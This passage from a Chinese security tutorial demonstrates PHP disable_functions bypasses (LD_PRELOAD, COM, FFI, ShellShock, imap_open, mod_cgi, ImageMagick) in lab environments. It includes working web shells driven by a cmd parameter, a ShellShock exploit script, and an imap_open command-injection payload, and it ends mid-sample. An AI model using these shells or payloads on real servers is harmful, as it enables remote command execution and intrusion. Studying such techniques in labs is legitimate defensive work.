operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD="</span> <span class="token punctuation">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>     <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接蚁剑上传</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004170528491.png" alt="image-20211004170528491"></p><p>访问目标网站</p><pre><code>http://xx.xx.xx.xx/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/ash&amp;sopath=/var/www/html/bypass_disablefunc_x64.so </code></pre><p>路径一定要对</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004173845745.png" alt="image-20211004173845745"></p><p>附上大佬的脚本<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>ps:上面的脚本是无需sendmail：巧用LD_PRELOAD突破disable_functions</p><p>参考:<a href="https://www.freebuf.com/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/web/192052.html</a></p><h3 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h3><p>windows里面的COM是系统本身就有存在的，不跟前面的php扩展一样，它是在system32下的wshom.ocx</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006133650046.png" alt="image-20211006133650046"></p><p>还可以在phpingo里面查看，默认是不开启的（如果没有这个组件就需要去php.ini中extension=php_com_dotnet.dll）</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006133916620.png" alt="image-20211006133916620"></p><p>因为是0，所以我们就需要去php.ini中开启</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006134051115.png" alt="image-20211006134051115"></p><p>然后再去查看就能看到0变成了1</p><p>剩下的就跟前面讲过的黑名单绕过里面com一样</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 生成一个COM对象　Shell.Application也能</span><span class="token variable">$exec</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd /c"</span><span class="token punctuation">.</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用对象方法来执行命令</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$exec</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006134719919.png" alt="image-20211006134719919"></p><h3 id="利用PHP-7-4-FFI绕过"><a href="#利用PHP-7-4-FFI绕过" class="headerlink" title="利用PHP 7.4 FFI绕过"></a>利用PHP 7.4 FFI绕过</h3><p>什么是FFI：外部函数接口。可以让用户在php里面调用c代码</p><p>条件：</p><ul><li>Linux 操作系统</li><li>PHP &gt;= 7.4</li><li>开启了 FFI 扩展且 ffi.enable=true</li></ul><p>去php.ini中开启FFI</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006190125969.png" alt="image-20211006190125969"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006190202162.png" alt="image-20211006190202162"></p><p>成功开启</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006190234944.png" alt="image-20211006190234944"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"$cmd > /tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然主要是因为FFI:cdef这个函数的作用</p><pre><code>$ffi = FFI::cdef("int system(const char *command);"); //声明了c语言中的system函数</code></pre><p>然后再是</p><pre><code>$ffi-&gt;system("$cmd &gt; /tmp/ash"); //通过GET传递的命令去执行</code></pre><p>因为输入的命令是没有回显，所以我们就需要去写进一个可读可写的路径下，就利用了</p><pre><code>echo file_get_contents("/tmp/ash");</code></pre><p>实验就采取了<a href="https://github.com/AntSwordProject/AntSword-Labs" target="_blank" rel="noopener">AntSword-Labs</a>的环境</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193113632.png" alt="image-20211006193113632"></p><p>连接密码ant</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193232361.png" alt="image-20211006193232361"></p><p>然后把上面的php代码上传上去</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193902614.png" alt="image-20211006193902614"></p><p>蚁剑也有绕过的插件，也可以用这个方法，因为我蚁剑的插件半天加载不来，借用了一下靶场的图</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006194625845.png" alt="image-20211006194625845"></p><h3 id="利用-ShellShock-CVE-2014-6271"><a href="#利用-ShellShock-CVE-2014-6271" class="headerlink" title="利用 ShellShock (CVE-2014-6271)"></a>利用 ShellShock (CVE-2014-6271)</h3><p>前提条件：</p><ul><li>Linux 操作系统，php &lt; 5.6.2</li><li><code>putenv</code>，<code>mail</code> or <code>error_log</code> 但是在AntSword-Labs禁用了 <code>mail</code> 但未禁用 <code>error_log</code></li><li><code>/bin/bash</code> 存在 <code>CVE-2014-6271</code> 漏洞</li><li><code>/bin/sh -&gt; /bin/bash</code> sh 默认的 shell 是 bash</li></ul><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>什么是Bash Shellshock 破壳漏洞：在bash中有一个独特的方法就是通过环境变量去定义函数，而导致该漏洞出现的原因就是字符串 <code>() {</code> 的格式作为开头， 那么该变量就会被当前 Bash 当作一个导出函数( <code>export function</code> ) , 该函数仅会在当前 Bash 的子进程中生效。【注意()和{中间有一个空格】。在命令<code>ENV</code>中解析成函数后，<code>Bash</code>执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><p>同时一般函数体内的代码不会被执行，但破壳漏洞会错误的将”{}”花括号外的命令进行执行。PHP里的某些函数（例如：mail()、imap_mail()）能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令</p><p>bash破击漏洞前提条件：</p><ul><li>被攻击的bash存在漏洞（版本小于等于4.3）</li><li>攻击者可以控制环境变量</li><li>新的bash进程被打开触发漏洞并执行命令</li></ul><h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>简单判断是否存在bash破击漏洞</p><pre><code>env x='() { :;}; echo vulnerable' bash -c "echo ash"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006200509265.png" alt="image-20211006200509265"></p><p>当出现了vulnerable，说明存在漏洞</p><p>当然AntSword-Labs的环境也禁用了很多函数，而蚁剑 虚拟终端中已经集成了对 ShellShock 的利用, 直接在虚拟终端执行命令即可<img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006203545431.png" alt="image-20211006203545431"></p><p>而查看进程</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006204438012.png" alt="image-20211006204438012"></p><p> PHP <code>error_log</code> 函数在执行 <code>sh -c -t -i</code>时就会触发Bash 的 ShellShock 漏洞，从而任意的命令执行</p><p>这个靶场的环境的根目录有一个flag的文件，直接打开是读取不了的，并且每次执行命令都会在tmp目录下生成一个as开头的文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006203947814.png" alt="image-20211006203947814"></p><p>直接取读cat是不行的，用tac就可以</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006204233635.png" alt="image-20211006204233635"></p><p>或者手动使用脚本exp</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token shell-comment comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><span class="token shell-comment comment"># Google Dork: none </span><span class="token shell-comment comment"># Date: 10/31/2014 </span><span class="token shell-comment comment"># Exploit Author: Ryan King (Starfall) </span><span class="token shell-comment comment"># Vendor Homepage: http:</span><span class="token comment" spellcheck="true">//php.net </span><span class="token shell-comment comment"># Software Link: http:</span><span class="token comment" spellcheck="true">//php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><span class="token shell-comment comment"># Version: 5.* (tested on 5.6.2) </span><span class="token shell-comment comment"># Tested on: Debian 7 and CentOS 5 and 6 </span><span class="token shell-comment comment"># CVE: CVE-2014-6271 </span><span class="token keyword">function</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// Execute a command via CVE-2014-6271 @mail.c:283 </span>   <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PHP_LOL=() { x; }; $cmd >$tmp 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// In Safe Mode, the user may only alter environment variableswhose names </span>   <span class="token comment" spellcheck="true">// begin with the prefixes supplied by this directive. </span>   <span class="token comment" spellcheck="true">// By default, users will only be able to set environment variablesthat </span>   <span class="token comment" spellcheck="true">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span>   <span class="token comment" spellcheck="true">// PHP will let the user modify ANY environment variable! </span>   <span class="token comment" spellcheck="true">//mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail </span>   <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token string">"No output, or not vuln."</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">echo</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我直接上传到www的目录下就可以执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006205942034.png" alt="image-20211006205942034"></p><p>但是看别人的文章，是上传到了/var/tmp目录下通过www/html目录下的一句话，include包含了、tmp目录来执行，</p><p>简单说一下/var/tmp跟/tmp的区别：</p><ul><li><code>/tmp</code> 意味着存活时间短（TTL）的快速存储（可能很小）。许多系统的清理 <code>/tmp</code> 速度非常快 - 在某些系统上，它甚至可以安装为RAM磁盘。 </li><li><code>/var/tmp</code> 通常位于物理磁盘上，较大，可以保存较长时间的临时文件。有些系统也是干净的 <code>/var/tmp</code> - 但TTL更长。</li></ul><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006210559453.png" alt="image-20211006210559453"></p><h3 id="利用imap-open-绕过"><a href="#利用imap-open-绕过" class="headerlink" title="利用imap_open()绕过"></a>利用imap_open()绕过</h3><p>CVE-2018-19518  就是PHP的imap_open函数导致的任意命令执行漏洞，可以去vulhub上面复现一下。</p><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a><strong>原理：</strong></h4><p><strong>imap_open也可以说是读取邮件的函数。并且这个函数是可以执行命令的</strong></p><p><strong>PHP 的==imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令==。该漏洞的存在是因为受影响的软件的imap_open函数在==将邮箱名称==传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器（理解为邮箱服务器）名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit</strong></p><p><strong>rsh和ssh的区别：</strong></p><p>两个节点之间的连接方式，但是ssh比rsh更加安全</p><p>ProxyCommand 指定用于连接服务器的命令</p><pre><code>ssh -oProxyCommand="echo hello|tee /tmp/executed" localhost</code></pre><p>就是在本地localhost生成一个executed文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008105542413.png" alt="img"></p><p>而 CVE-2018-19518主要就是没有过滤造成的任意命令的执行</p><pre><code>imap_open（string $mailbox , string $username , string $password）</code></pre><p>函数中的mailbox是执行命令参数的一部分，所以我们可以通过更改邮箱名来进行命令注入执行</p><p>我们可以通过下面的方式来对mailbox的利用</p><pre><code>{[host]}:[port][flags]}[mailbox_name] //需要定义的的mailbox参数$mbox = imap_open ("{localhost:1234/PROTOCOL/FLAG}INBOX", "user_id", "password");</code></pre><p>这上面跟我们后面的exp有关，INBOX是当前用户的个人邮箱，还能看到localhost，端口，协议，</p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><strong>分析：</strong></h4><p>比如下面这个，当我们执行命令时候，我们并没有localhost进行连接，但是仍然创建成功</p><pre><code>root@1:/var/www/html# ssh -oProxyCommand="touch ash" localhostssh_exchange_identification: Connection closed by remote hostroot@1:/var/www/html# ls | grep ashash</code></pre><p>尽管命令成功了，但是我们不能将该直接移动我们的php脚本中，也就是mailbox中，因为在解析的时候，会把空格当作空格符或者斜杠作为标志，当然空格我们可以使用\t或者$IFS去代替，而斜杠呢我们可以用base64编码去绕过，所以我们直接将我们要执行的那些命令转换成base64</p><pre><code>root@kali:# echo "touch ash" | base64dG91Y2ggYXNoCg==root@kali:# ssh -oProxyCommand="echo dG91Y2ggYXNoCg==|base64 -d|sh" localhost</code></pre><p>这里有一篇具体分析的<a href="https://xz.aliyun.com/t/4113" target="_blank" rel="noopener">https://xz.aliyun.com/t/4113</a></p><p>exp</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'imap_open'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no imap_open function!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$server</span> <span class="token operator">=</span> <span class="token string">"x -oProxyCommand=echo\t"</span> <span class="token punctuation">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">">/tmp/result"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"|base64\t-d|sh}"</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token comment" spellcheck="true">//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';*</span><span class="token function">imap_open</span><span class="token punctuation">(</span><span class="token string">'{'</span> <span class="token punctuation">.</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">':143/imap}INBOX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">// or var_dump("\n\nError: ".imap_last_error());*</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/result"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显示判断是否存在imap_open，然后后就是我们要传递的命令进去，输入结果并显示出来。sleep(5)是等待imap_open执行完</p><p><strong>安装php的imap_open</strong></p><pre><code>apt-get install php-imap</code></pre><p>安装完了之后去php.ini中打开，imap.enable_insecure_rsh选项为On </p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008110439317.png" alt="img"></p><p>打开phpinfo查看</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008110500775.png" alt="img"></p><p>开启成功了</p><p>试了好久，执行命令没有回显，并且没有生成文件，有空再研究吧。</p><p>正常情况下，执行后就会有回显了，再页面上</p><h4 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a><strong>防御方式</strong></h4><ul><li>设置imap.enable_insecure_rsh选项为Off；</li><li>可以的话禁用imap_open()函数；</li></ul><h3 id="利用-Apache-Mod-CGI"><a href="#利用-Apache-Mod-CGI" class="headerlink" title="利用 Apache Mod CGI"></a><strong>利用 Apache Mod CGI</strong></h3><p>环境还是利用的AntSword-Labs</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>因为在早期的web服务器中，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为CGI是Web服务器和运行在其上的应用程序进行“交流”的一种约定。</p><p>当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p><p>而对于 Mod CGI，Web 服务器可以内置 Perl 解释器或 PHP 解释器。 也就是说将这些解释器做成模块的方式，Web 服务器会在启动的时候就启动这些解释器。 当有新的动态请求进来时，Web 服务器就是自己解析这些动态脚本，省得重新 Fork 一个进程，效率提高了。</p><p>任何具有 MIME 类型 application/x-httpd-cgi 或者被 cgi-script 处理器处理的文件都将被作为 CGI 脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为 CGI 脚本，一种是文件具有已由 AddType 指令定义的扩展名，另一种是文件位于 ScriptAlias 目录中</p><p>Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：</p><p>Options +ExecCGI</p><p>AddHandler cgi-script .xxx</p><p>这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions。</p><p>也就是说：利用Apache的rewrite模块对 URL 进行重写的时候， rewrite规则会写在 .htaccess 文件里。但要使 apache 能够正常的读取.htaccess 文件的内容，就必须对.htaccess 所在目录进行配置</p><p>AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件，如果设置为All,那么所有在.htaccess文件里有的指令都将被重写</p><pre><code>Options +ExecCGIAddHandler cgi-script .xxx</code></pre><p>这样便会将当前目录下的所有的.xxx文件当做CGI程序执行了。</p><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a><strong>前提</strong></h4><ul><li>Linux 操作系统</li><li>Apache + PHP (apache 使用 apache_mod_php)</li><li>Apache 开启了 cgi、rewrite</li><li>Web 目录给了 AllowOverride 权限（不为None）</li><li>当前目录可写</li></ul><p><strong>利用</strong></p><p>打开我们的环境</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008153923119.png" alt="img"></p><p>还是一样无法执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008154027489.png" alt="img"></p><p>查看是否开启rewrite和CGI（在phpinfo的apache环境看）</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008154412496.png" alt="img"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008154433196.png" alt="img"></p><p>首先我们先创建一个.htaccess文件，内容如下</p><pre><code>Options +ExecCGIAddHandler cgi-script .ant</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155430617.png" alt="img"></p><p>然后再创建一个shell.ant文件</p><pre><code>#!/bin/shecho Content-type: text/htmlecho ""echo&amp;&amp;id</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155520246.png" alt="img"></p><p>直接访问</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155710346.png" alt="img"></p><p>报错是因为权限不够，直接再蚁剑修改成0777，或者</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008160024035.png" alt="img"></p><p>再次访问</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155754474.png" alt="img"></p><p>或者使用蚁剑的插件，使用后会新生成一个新的终端，然后可以执行命令</p><h3 id="利用-ImageMagick"><a href="#利用-ImageMagick" class="headerlink" title="利用 ImageMagick"></a><strong>利用 ImageMagick</strong></h3><p>什么是imagemagick：一个用于处理图片的程序，它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>利用的是ImageMagick 的一个漏洞（CVE-2016-3714）。漏洞的利用过程非常简单，只要将精心构造的图片上传至使用漏洞版本的 ImageMagick，ImageMagick 会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。可以是在phpinfo中查看是否存在</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h4><p>利用已经创建的好的docker环境【ImageMagick 命令执行漏洞（CVE-2016–3714）环境】</p><pre><code>docker pull medicean/vulapps:i_imagemagick_1docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1</code></pre><p>访问一下phpinfo，看看是否存在</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008161804069.png" alt="img"></p><p>先进入容器查看一下是否存在漏洞</p><p>可以看到已经存在poc</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008162244037.png" alt="img"></p><p>执行的命令就是 ls -la</p><p>在容器内验证poc</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008162424806.png" alt="img"></p><p>在容器外验证</p><pre><code>docker exec i_imagemagick_1 convert /poc.png 1.png //i_imagemagick_1容器名称</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008162658912.png" alt="img"></p><p>验证成功存在漏洞</p><h4 id="远程命令测试使用poc"><a href="#远程命令测试使用poc" class="headerlink" title="远程命令测试使用poc"></a><strong>远程命令测试使用poc</strong></h4><p>首先访问环境中存在的poc.php</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008170709510.png" alt="img"></p><p>再来看看poc.php里面有什么</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$base64</span> <span class="token operator">=</span> "iVBORw0KGgoAAAANSUhEUgAAAM0AAADNCAMAAAAsYgRbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABJQTFRF3NSmzMewPxIG<span class="token comment" spellcheck="true">//ncJEJsldTou1jHgAAAARBJREFUeNrs2EEK</span>gCAQBVDLuv<span class="token operator">+</span>V20dENbMY831wKz4Y<span class="token operator">/</span>VHb<span class="token operator">/</span><span class="token constant">5RGQ0NDQ0NDQ0NDQ0NDQ0NDQ</span>0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0PzMWtyaGhoaGhoaGhoaGhoaGhoxtb0QGhoaGhoaGhoaGhoaGhoaMbRLEvv50VTQ9OTQ5OpyZ01GpM2g0bfmDQaL7S<span class="token 